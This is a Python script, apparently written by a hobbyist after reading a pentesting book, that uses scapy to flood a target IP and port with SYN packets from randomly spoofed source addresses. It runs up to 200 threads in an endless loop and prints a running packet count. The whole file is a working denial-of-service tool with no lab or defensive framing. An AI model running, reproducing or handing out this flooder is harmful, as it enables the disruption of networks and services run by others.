# Thanks to a book lol ! Violent CookBook for pentesters
# The book had a spoofing syn ack requests with the help of scapy part so I got the idea from it .
# Hail Books ! 
import socket
from socket import *
import random
import sys
import threading
from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)



class sendSYN(threading.Thread):
	global target, port
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):

		
		i = IP()
		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		i.dst = target

		t = TCP()
		t.sport = random.randint(1,65535)
		t.dport = port
		t.flags = 'S'

		send(i/t, verbose=0)

target       = None
port         = None
thread_limit = 200
total        = 0


if __name__ == "__main__":
	
	if len(sys.argv) != 3:
		print ("Usage: %s <Target IP> <Port>" % sys.argv[0])
		exit()

	
	target           = sys.argv[1]
	port             = int(sys.argv[2])
	conf.iface = "eth0" 

	
	print ("Bombing %s:%i SYN packets." % (target, port))
	while True:
		if threading.activeCount() < thread_limit: 
			sendSYN().start()
			total += 1
			sys.stdout.write("\rPackets SYN\t:\t\t\t%i" % total)
